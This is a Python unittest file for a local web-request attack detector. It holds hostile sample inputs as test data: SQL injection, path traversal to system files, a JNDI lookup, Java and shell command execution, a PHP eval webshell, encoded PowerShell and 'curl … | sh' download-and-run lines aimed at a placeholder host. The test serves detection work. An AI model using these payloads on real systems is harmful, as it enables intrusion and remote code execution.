import json
from pathlib import Path
import re
import sys
import unittest
from unittest.mock import patch
from urllib.parse import quote

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from local_detection import LocalDetector, MAX_FIELD_CHARACTERS, MAX_SCAN_CHARACTERS, RULES
from security import ATTACK_TYPES, DeepSeek


def event(i=1, ip='8.8.8.8', target='/api/query', body=None, **extra):
    result = {'id': i, 'website': 7, 'ip': ip, 'method': 'POST', 'target': target,
              'status': 200, 'userAgent': 'Hutool', 'recordedAt': 1793836800 + i, 'truncated': False}
    if body is not None:
        result.update(requestBody=body, bodyMeta={'state': 'plain', 'unresolved': 0, 'truncated': False})
    result.update(extra)
    return result


class LocalDetectionTests(unittest.TestCase):
    def setUp(self):
        self.detector = LocalDetector()

    def analyze_one(self, item):
        result = self.detector.analyze([item], {})
        DeepSeek.validate({'decisions': result}, [item])
        self.assertEqual(result[0]['confidence'], 1.0)
        self.assertTrue(result[0]['local'])
        return result[0]

    def test_exportable_static_rules_have_unique_ids_and_existing_categories(self):
        self.assertEqual(len({r['id'] for r in RULES}), len(RULES))
        json.dumps(RULES)
        for rule in RULES:
            self.assertTrue(all(rule.get(k) for k in ('id', 'name', 'category', 'expression')))
            self.assertIn(rule['category'], ATTACK_TYPES)
            self.assertNotEqual(rule['category'], 'xss')
            re.compile(rule['expression'], re.I)

    def test_high_specificity_sql_markers(self):
        values = [('1 UNION ALL SELECT 1', 'SQL_UNION_SELECT'),
                  ("' OR 1=1 --", 'SQL_BOOLEAN'), ("' or '1'='1'", 'SQL_BOOLEAN'),
                  ('1 AND sleep(5)', 'SQL_TIME_DELAY'), ("';WAITFOR DELAY '0:0:5'--", 'SQL_WAITFOR'),
                  ('1; DROP TABLE sample', 'SQL_STACKED_DDL'),
                  ("SELECT load_file('/etc/hosts')", 'SQL_FILE_IO'),
                  ('UNION/**/SELECT 1', 'SQL_UNION_SELECT')]
        for value, expected in values:
            with self.subTest(expected=expected):
                verdict = self.analyze_one(event(body={'body': {'query': value}}))
                self.assertTrue(verdict['is_attack'])
                self.assertIn(expected, verdict['modelFacts']['ruleIds'])
                self.assertEqual(verdict['attack_type'], 'sql_injection')
                self.assertEqual(verdict['evidence_ids'], [1])

    def test_normal_business_select_xml_json_ua_ip_and_status_are_not_attacks(self):
        bodies = [{'body': {'operation': 'select', 'query': 'select a doctor', 'value': 'or and normal text'}},
                  '<xml><return_code><![CDATA[SUCCESS]]></return_code><body>select</body></xml>',
                  {'body': {'html': '<script>alert(1)</script>', 'description': 'onload=x'}},
                  {'body': {'method_code': 'downloadFile', 'path': '/normal/file.pdf'}}]
        for body in bodies:
            for status in (200, 302, 403, 500):
                with self.subTest(status=status, body_type=type(body).__name__):
                    verdict = self.analyze_one(event(ip='8.8.10.148', body=body, status=status,
                                                     userAgent='curl/8.0 recon-probe/1.0 Hutool'))
                    self.assertFalse(verdict['is_attack'])
                    self.assertEqual(verdict['attack_type'], 'none')
                    self.assertEqual(verdict['evidence_ids'], [])
                    self.assertEqual(verdict['reason'], '未命中本地规则，未确认安全')

    def test_traversal_slashes_url_encoding_and_json_escapes(self):
        plain = '../../Windows/win.ini'
        twice = quote(quote(plain, safe=''), safe='')
        triple = quote(twice, safe='')
        values = [plain, r'..\..\Windows\win.ini', twice, triple,
                  r'\u002e\u002e\u005c\u002e\u002e\u005cWindows\u005cwin.ini',
                  json.dumps({'body': {'path': plain}})]
        for value in values:
            with self.subTest(value=value):
                verdict = self.analyze_one(event(body={'body': {'file': value}}))
                self.assertTrue(verdict['is_attack'])
                self.assertIn('PATH_TRAVERSAL', verdict['modelFacts']['ruleIds'])
        verdict = self.analyze_one(event(target='/download?path=' + triple))
        self.assertIn('PATH_TRAVERSAL', verdict['modelFacts']['ruleIds'])
        self.assertGreaterEqual(verdict['modelFacts']['findings'][0]['decodeRound'], 2)

    def test_rce_deserialization_webshell_and_jndi_markers(self):
        cases = [('${jndi:ldap://example.invalid/a}', 'RCE_JNDI'),
                 ('Runtime.getRuntime().exec("whoami")', 'RCE_JAVA_EXEC'),
                 ('new ProcessBuilder("whoami")', 'RCE_JAVA_EXEC'),
                 ('@java.lang.Runtime@getRuntime()', 'RCE_OGNL_TEMPLATE'),
                 ('{"@type":"com.sun.rowset.JdbcRowSetImpl"}', 'RCE_DESERIALIZATION_GADGET'),
                 ('org.apache.commons.collections.functors.InvokerTransformer', 'RCE_DESERIALIZATION_GADGET'),
                 ("<?php eval($_POST['code']); ?>", 'RCE_PHP_WEBSHELL'),
                 ('cmd.exe /c whoami', 'RCE_COMMAND'),
                 ('powershell -nop -enc QUJD', 'RCE_COMMAND'),
                 ('curl https://example.invalid/a | sh', 'RCE_DOWNLOAD_PIPE')]
        with patch('socket.create_connection', side_effect=AssertionError('must stay offline')), \
                patch('subprocess.run', side_effect=AssertionError('must not execute content')):
            for value, expected in cases:
                with self.subTest(expected=expected):
                    verdict = self.analyze_one(event(body={'payload': value}))
                    self.assertTrue(verdict['is_attack'])
                    self.assertEqual(verdict['attack_type'], 'rce')
                    self.assertIn(expected, verdict['modelFacts']['ruleIds'])

    def test_sensitive_files_are_target_scoped(self):
        for path in ('/.env', '/.git/HEAD', '/.git/config', '/WEB-INF/web.xml', '/actuator/heapdump'):
            with self.subTest(path=path):
                verdict = self.analyze_one(event(target=path))
                self.assertEqual(verdict['attack_type'], 'scanner')
        self.assertFalse(self.analyze_one(event(body={'description': '/.env is a configuration file'}))['is_attack'])
        self.assertFalse(self.analyze_one(event(target='/actuator/health'))['is_attack'])

    def test_jsp_php_class_and_shell_markers_are_review_findings(self):
        cases = [('<%@ page import="private-value" %>', 'RCE_JSP_CODE'),
                 ('<%= privateExpression %>', 'RCE_JSP_CODE'),
                 ('loader.defineClass(privateClassBytes)', 'RCE_JSP_CODE'),
                 ('<?php echo "private-value"; ?>', 'RCE_PHP_TAG'),
                 ('/bin/sh', 'RCE_SHELL'), ('/bin/bash -c "private-value"', 'RCE_SHELL'),
                 ('bash -i', 'RCE_SHELL'), ('sh -c "private-value"', 'RCE_SHELL')]
        for value, rule_id in cases:
            with self.subTest(rule_id=rule_id, value=value):
                verdict = self.analyze_one(event(body={'payload': value}))
                self.assertTrue(verdict['is_attack'])
                self.assertIn(rule_id, verdict['modelFacts']['ruleIds'])
                self.assertIn('人工核验', verdict['reason'])
                self.assertNotIn('private-value', json.dumps(verdict))
                self.assertNotIn('privateExpression', json.dumps(verdict))
                self.assertNotIn('privateClassBytes', json.dumps(verdict))
        for value in ('<?xml version="1.0"?><xml><return_code>SUCCESS</return_code></xml>',
                      '<?phpmailer', '/bin/shadow', 'bash -config normal', 'defineClassName(value)'):
            with self.subTest(normal=value):
                self.assertFalse(self.analyze_one(event(body={'payload': value}))['is_attack'])

    def test_exec_command_only_matches_exact_json_method_fields(self):
        for body in ({'method': 'execCommand'}, {'methodName': 'execCommand'},
                     {'body': {'nested': json.dumps({'methodName': 'execCommand', 'args': 'private-command'})}}):
            verdict = self.analyze_one(event(body=body))
            self.assertIn('RCE_BACKDOOR_EXEC', verdict['modelFacts']['ruleIds'])
            self.assertNotIn('private-command', json.dumps(verdict))
        for body in ({'description': 'execCommand'}, {'method': 'orgine.poweruap.api.proxy.core.proxy'},
                     {'methodName': 'execCommandStatus'}, {'method': 'getFile'},
                     '<xml><method>execCommand</method><return_code>SUCCESS</return_code></xml>'):
            with self.subTest(normal=body):
                self.assertFalse(self.analyze_one(event(body=body))['is_attack'])

    def test_java_class_decoder_metadata_is_scoped_and_uses_fixed_marker(self):
        verdict = self.analyze_one(event(body='opaque-bytes',
                                         bodyMeta={'state': 'decoded', 'format': 'java-class'}))
        self.assertIn('RCE_JAVA_CLASS', verdict['modelFacts']['ruleIds'])
        self.assertEqual(next(f['snippet'] for f in verdict['modelFacts']['findings']
                              if f['ruleId'] == 'RCE_JAVA_CLASS'), 'bodyMeta.format = java-class')
        for body in ('java-class', {'format': 'java-class'}):
            self.assertFalse(self.analyze_one(event(body=body))['is_attack'])

    def test_only_yq_prefixed_track_fields_get_strict_shape_check(self):
        valid = ['YQ_1793803000989278_01', '936e290f-5d16-435a-8f29-64eaae15f368',
                 '936e290f5d16435a8f2964eaae15f368', 'business-id', 'ABC_123']
        invalid = ['YQ_SQ_38939', 'YQ_123_01', 'YQ_1793803000989278_001',
                   'YQ_1793803000989278_01 trailing', 'YQ_１７９３８０３０００９８９２７８_01',
                   ' YQ_1793803000989278_01']
        for code in valid + invalid:
            with self.subTest(code=code):
                verdict = self.analyze_one(event(body={'head': {'sys_track_code': code}}))
                self.assertEqual(verdict['is_attack'], code in invalid)
                if code in invalid:
                    self.assertIn('YQ_TRACK_FORMAT', verdict['modelFacts']['ruleIds'])
                    self.assertNotIn(code, json.dumps(verdict, ensure_ascii=False))
        self.assertFalse(self.analyze_one(event(body={'description': 'YQ_SQ_38939'}))['is_attack'])

    def test_track_fields_in_nested_json_and_query_parameters(self):
        bodies = [json.dumps({'head': {'sys_track_code': 'YQ_SQ_38939'}}),
                  {'body': {'body_content': json.dumps({'head': {'sys_track_code': 'YQ_SQ_38939'}})}}]
        for body in bodies:
            verdict = self.analyze_one(event(body=body))
            self.assertIn('YQ_TRACK_FORMAT', verdict['modelFacts']['ruleIds'])
        verdict = self.analyze_one(event(target='/api?sys_track_code=YQ_SQ_38939'))
        self.assertIn('YQ_TRACK_FORMAT', verdict['modelFacts']['ruleIds'])
        verdict = self.analyze_one(event(body='sys_track_code=YQ_SQ_38939',
                                         bodyMeta={'state': 'plain', 'contentType': 'application/x-www-form-urlencoded'}))
        self.assertIn('YQ_TRACK_FORMAT', verdict['modelFacts']['ruleIds'])

    def test_private_inputs_are_detected_but_secrets_never_returned(self):
        item = event(body={'token': '[REDACTED]'}, target='/api?token=[REDACTED]',
                     _localTarget="POST /api?token=prefix%27+OR+%27private-a%27=%27private-b%27 HTTP/1.1",
                     _localRequestBody={'token': 'secret-token UNION SELECT 1',
                                        'patient_name': 'patient-private',
                                        'body': {'command': 'curl https://user:private-password@example.invalid/a | sh'}})
        verdict = self.analyze_one(item)
        text = json.dumps(verdict, ensure_ascii=False)
        for secret in ('secret-token', 'patient-private', 'private-password', 'private-a', 'private-b'):
            self.assertNotIn(secret, text)
        self.assertIn('SQL_BOOLEAN', verdict['modelFacts']['ruleIds'])
        self.assertIn('SQL_UNION_SELECT', verdict['modelFacts']['ruleIds'])
        self.assertIn('RCE_DOWNLOAD_PIPE', verdict['modelFacts']['ruleIds'])
        union = next(f for f in verdict['modelFacts']['findings'] if f['ruleId'] == 'SQL_UNION_SELECT')
        self.assertEqual(union['snippet'], '[REDACTED]')
        self.assertTrue(all(len(f['snippet']) <= 160 for f in verdict['modelFacts']['findings']))

    def test_multiple_ips_and_categories_keep_only_real_current_ip_evidence(self):
        items = [event(-1, body={'query': 'UNION SELECT 1'}),
                 event(-2, body={'cmd': 'cmd /c whoami'}),
                 event(-3, body={'path': '../../etc/passwd'}),
                 event(-4, ip='1.1.1.1', body={'operation': 'select'}),
                 event(-5, ip='9.9.9.9', target='/.env')]
        before = json.dumps(items, ensure_ascii=False)
        results = self.detector.analyze(items, {'provider': 'deepseek', 'key': 'unused'})
        DeepSeek.validate({'decisions': results}, items)
        indexed = {r['ip']: r for r in results}
        self.assertEqual(indexed['8.8.8.8']['evidence_ids'], [-1, -2, -3])
        self.assertEqual(indexed['8.8.8.8']['attack_type'], 'rce')
        self.assertEqual(set(indexed['8.8.8.8']['modelFacts']['ruleIds']),
                         {'SQL_UNION_SELECT', 'RCE_COMMAND', 'PATH_TRAVERSAL'})
        self.assertEqual(indexed['1.1.1.1']['evidence_ids'], [])
        self.assertEqual(indexed['9.9.9.9']['evidence_ids'], [-5])
        self.assertEqual(json.dumps(items, ensure_ascii=False), before)
        self.assertEqual(self.detector.analyze([]), [])

    def test_incomplete_decryption_and_truncation_never_claim_safety(self):
        verdict = self.analyze_one(event(body='opaque-encrypted-content',
                                         bodyMeta={'state': 'encrypted', 'unresolved': 1, 'truncated': True}))
        self.assertFalse(verdict['is_attack'])
        self.assertIn('未确认安全', verdict['reason'])
        self.assertTrue(verdict['modelFacts']['warnings'])
        self.assertEqual(verdict['modelFacts']['coverage']['limitedEvents'], 1)
        self.assertEqual(verdict['modelFacts']['coverage']['incompleteEvents'], 1)

    def test_field_and_total_scan_budgets_are_bounded_and_reported(self):
        item = event(body={'a': 'x' * (MAX_FIELD_CHARACTERS + 10),
                           'b': 'x' * MAX_FIELD_CHARACTERS,
                           'c': '../../after-budget'})
        verdict = self.analyze_one(item)
        self.assertLessEqual(verdict['modelFacts']['coverage']['scannedCharacters'], MAX_SCAN_CHARACTERS)
        self.assertEqual(verdict['modelFacts']['coverage']['limitedEvents'], 1)
        self.assertTrue(verdict['modelFacts']['warnings'])
        self.assertIn('未确认安全', verdict['reason'])

    def test_json_depth_and_number_of_nodes_are_bounded(self):
        deep = {'path': '../../etc/passwd'}
        for _ in range(30):
            deep = {'body': deep}
        for body in (deep, ['normal'] * 3000):
            verdict = self.analyze_one(event(body=body))
            self.assertTrue(verdict['modelFacts']['warnings'])
            self.assertEqual(verdict['modelFacts']['coverage']['limitedEvents'], 1)


if __name__ == '__main__':
    unittest.main()
